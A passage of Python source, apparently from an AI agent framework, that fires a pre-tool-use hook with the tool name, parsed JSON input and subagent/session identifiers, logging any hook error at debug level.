    tool calls to the specific agent/session that fired them. Callers in
    parent contexts (dashboard chat, generic LLM helpers) leave them as
    ``None``; subagent and taskrunner callers pass real values.
    """
    if hook_store is None:
        return
    tool_name = event_title or ""
    if tool_name.startswith("Running: "):
        tool_name = tool_name[9:]
    tool_input = None
    if event_tool_input:
        try:
            tool_input = json.loads(event_tool_input)
        except Exception:
            pass
    try:
        await hook_store.fire(
            HOOK_EVENT_PRE_TOOL_USE,
            tool_name=tool_name,
            tool_input=tool_input,
            subagent_id=subagent_id,
            parent_session_key=parent_session_key,
            agent_role=agent_role,
        )
    except Exception:
        logger.debug("PreToolUse hook error", exc_info=True)
